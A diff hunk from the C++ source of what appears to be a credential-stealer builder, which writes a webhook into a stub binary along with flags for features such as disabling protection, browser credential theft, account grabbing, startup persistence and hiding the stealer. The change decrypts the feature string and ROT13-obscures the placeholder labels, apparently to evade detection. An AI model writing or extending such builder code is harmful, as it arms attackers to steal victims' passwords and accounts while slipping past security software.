@@ -273,8 +273,8 @@ int main(int argc, char* argv[])
 			size_t DummyTextLocation = AllBytes.find(DummyText);
 			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
 			string RawLocation = CMDParts[1];
-			string Features = CMDParts[2];
-			string DummyFeatures = XorStr("[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]");
+			string Features = decrypt(CMDParts[2]);
+			string DummyFeatures = XorStr("[QvfnoyrCebg:(A)]--[Genpre:(A)]--[Erpbire:(A)]--[TrgNyyNppf:(A)]--[QryrgrTG:(A)]--[FgnegHc:(A)]--[UvqrFgrnyre:(A)]--[OebjfrePerqf:(A)]");
 			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
 			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
 			string Location = RawLocation.substr(1, RawLocation.size() - 2);
